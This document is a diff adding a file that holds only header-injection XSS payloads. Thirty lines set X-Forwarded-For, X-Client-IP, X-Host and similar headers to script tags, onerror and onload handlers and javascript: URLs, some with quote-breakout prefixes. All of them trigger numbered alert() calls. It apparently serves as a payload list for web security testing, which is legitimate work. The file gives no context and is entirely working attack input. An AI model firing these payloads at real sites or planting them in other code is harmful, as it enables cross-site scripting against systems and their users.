@@ -1,0 +1,34 @@
+X-Forwarded-For: "><script>alert('XSS1')</script>
+X-Forwarded-Host: <img src="x" onerror="alert('XSS2')">
+X-Client-IP: <svg/onload=alert('XSS3')>
+X-Remote-IP: <body onload="alert('XSS4')">
+X-Remote-Addr: <a href="javascript:alert('XSS5')">click me</a>
+X-Host: <iframe src="javascript:alert('XSS6')"></iframe>
+
+X-Forwarded-For: <script>alert('XSS7')</script>
+X-Forwarded-Host: <img src="x" onerror="alert('XSS8')">
+X-Client-IP: <svg/onload=alert('XSS9')>
+X-Remote-IP: <body onload="alert('XSS10')">
+X-Remote-Addr: <a href="javascript:alert('XSS11')">click me</a>
+X-Host: <iframe src="javascript:alert('XSS12')"></iframe>
+
+X-Forwarded-For: "><script>alert('XSS13')</script>
+X-Forwarded-Host: '><img src="x" onerror="alert('XSS14')">
+X-Client-IP: '><svg/onload=alert('XSS15')>
+X-Remote-IP: '><body onload="alert('XSS16')">
+X-Remote-Addr: '><a href="javascript:alert('XSS17')">click me</a>
+X-Host: '><iframe src="javascript:alert('XSS18')"></iframe>
+
+X-Forwarded-For: <script>alert('XSS19')</script>
+X-Forwarded-Host: <img src="x" onerror="alert('XSS20')">
+X-Client-IP: <svg/onload=alert('XSS21')>
+X-Remote-IP: <body onload="alert('XSS22')">
+X-Remote-Addr: <a href="javascript:alert('XSS23')">click me</a>
+X-Host: <iframe src="javascript:alert('XSS24')"></iframe>
+
+X-Forwarded-For: <script>alert('XSS25')</script>
+X-Forwarded-Host: <img src="x" onerror="alert('XSS26')">
+X-Client-IP: <svg/onload=alert('XSS27')>
+X-Remote-IP: <body onload="alert('XSS28')">
+X-Remote-Addr: <a href="javascript:alert('XSS29')">click me</a>
+X-Host: <iframe src="javascript:alert('XSS30')"></iframe>
